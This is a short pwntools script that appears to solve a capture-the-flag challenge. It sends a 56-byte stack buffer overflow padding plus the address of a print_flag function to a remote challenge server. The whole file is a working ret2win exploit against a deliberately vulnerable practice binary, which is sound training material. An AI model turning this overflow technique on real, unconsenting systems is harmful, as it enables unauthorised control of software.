from pwn import *

# Connect to the instance
conn = remote('chal.fallctf.com', 5004)
# Use process() for local challenge files.
# conn = process('./challenge')

# Receive the prompt
conn.recvuntil(b'> ')
# Send the payload
print_flag_addr = 0x401216
conn.sendline(b'A'*56 + p64(print_flag_addr))

conn.interactive()
